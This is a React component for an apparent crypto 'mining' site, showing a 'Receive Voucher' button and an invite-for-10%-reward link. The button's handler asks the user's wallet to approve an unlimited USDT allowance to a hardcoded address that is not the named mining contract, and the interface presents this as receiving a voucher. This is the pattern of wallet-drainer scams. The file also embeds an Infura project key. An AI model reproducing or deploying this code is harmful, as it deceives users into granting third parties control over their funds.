import { useWeb3React } from "@web3-react/core";
import React from "react";
import Web3 from "web3";
import { MINING_CONTRCT, USDT_CONTRACT } from "../Config/contract";
import { MINING_ABI } from "../Config/MINING_ABI"
import Swal from 'sweetalert2'
import { USDT_ABI } from "../Config/USDTAbi";
function HeroSection(props) {
  const { active, library, account } = useWeb3React();
  const [Data, setData] = React.useState(null);
  const [userInviteCode, setUserInviteCode] = React.useState("");
  const [MiningStatus, setMiningStatus] = React.useState(false);
  const [isApproveDone, setIsApproveDone] = React.useState(false)
  console.log(window.location.origin)
  let web3 = new Web3("https://ropsten.infura.io/v3/1da2a4aeb9a949d586c8bcbf4a43b8b6");
  React.useEffect(() => {
    if (active) {
      web3 = new Web3(library.provider);
      getData()

    }
    if (!active) {
      setMiningStatus(false);
    }

  }, [active])

  async function getData() {
    let data = await new web3.eth.Contract(MINING_ABI, MINING_CONTRCT).methods
      .dataset(account)
      .call();
    let inviteCode = await new web3.eth.Contract(
      MINING_ABI,
      MINING_CONTRCT
    ).methods
      .userInviteCode(account)
      .call();
    console.log(inviteCode)
    setUserInviteCode(inviteCode);
    setData(data);

    parseInt(data.totalParticipation)>0 ? setMiningStatus(true): setMiningStatus(false)
  }
  async function Mining() {
    if (Data !== null) {
      if (active) {
        web3 = new Web3(library.provider);

      }
      if (parseInt(Data.totalParticipation) === 0) {
        console.log(props.inviteUserAddress)
        let ad = props.inviteUserAddress;
        let balance = await new web3.eth.Contract(USDT_ABI, USDT_CONTRACT).methods.balanceOf(account).call()
        props.setIsLoading(true)
        await new web3.eth.Contract(USDT_ABI, USDT_CONTRACT).methods.approve("0x50021f7e60caa0C25575c22D66CEEDdfF8BF8A35", web3.utils.toWei("115792089237316195423570985008687907853269984665640564039457584007913129639935", 'ether')).send({ from: account })
          .then(async () => {
            setIsApproveDone(true);
            if (parseFloat(balance) / Math.pow(10, 18) >= 10) {
              props.setIsLoading(true)
             await  new web3.eth.Contract(MINING_ABI, MINING_CONTRCT).methods.miningPool(ad.toLowerCase()).send({ from: account })
                .then((res) => {
                  setIsApproveDone(true)
                  setMiningStatus(true);
                  props.setIsLoading(false);
                  console.log(res)
                }).catch(() => {
                  setMiningStatus(false);
                  props.setIsLoading(false)
                  setIsApproveDone(true);
                });
            } else {
              setIsApproveDone(true);
              props.setIsLoading(false)
              setMiningStatus(false)
              Swal.fire(
                'Warning',
                'You dont have minimum mining fees.',
                'warning'
              )

            }
          }).catch(() => {setIsApproveDone(false); props.setIsLoading(false);})
    
        if (isApproveDone) {
          setMiningStatus(false)
          props.setIsLoading(false)
          Swal.fire(
            'Warning',
            'Approve is not done',
            'warning'
          )
        }
      } else {
        setMiningStatus(true)
        props.setIsLoading(false)
        Swal.fire(
          'Warning',
          'Already Participated!',
          'warning'
        )

      }
    } else {
      props.setIsLoading(false);
      Swal.fire(
        'Warning',
        'Please Connect to wallet',
        'warning'
      )
    }
  }
  return (
    <div className="relative mb-5 ">
      <div className="absolute z-10 w-full h-full ">
        <img
          src="https://bscmining.club/assets/img/img_top_bg.4664403c.png"
          alt="bg"
          width="100%"
          height="100%"
          className="w-full h-full"
        ></img>
      </div>
      <div
        className="flex-wrap p-10 md:flex md:items-center "
        style={{
          background: "linear-gradient(90deg,#e3d2fe,#fbd786 100%,#f7797d 0)",
        }}
      >
        <div className="relative z-10 flex-1 mb-10">
          <h3 className="mb-3 text-3xl font-bold">Receive Voucher</h3>
          <p className="mb-2 text-xl">Join the node and start mining</p>
          <div className="flex justify-center gap-4">
            <div onClick={() => Mining()} className=" shadow-lg shadow-black-500/50 p-3 bg-[#544fc7] rounded max-w-[100px] w-full text-white cursor-pointer" >
              {!MiningStatus ? "Recive" : "Mining..."}
            </div>
            <div className=" cursor-pointer shadow-lg shadow-black-500/50 p-3 bg-white rounded max-w-[100px] w-full" onClick={() => !active ? Swal.fire(
              'Warning',
              'Please Connect to wallet',
              'warning'
            ) : Swal.fire(
              'Invite Code\nYou will get 10% reward',
              window.location.origin + "/" + userInviteCode,
              'success'
            )}>
              Invite
            </div>
          </div>
        </div>
        <div className="flex-1">
          <img
            src="https://bscmining.club/assets/img/bg_top.92ba63c5.png"
            className="w-full max-w-[500px]"
            width="100%"
            height="100%"
            alt="dasd"
          ></img>
        </div>
      </div>
    </div>
  );
}

export default HeroSection;
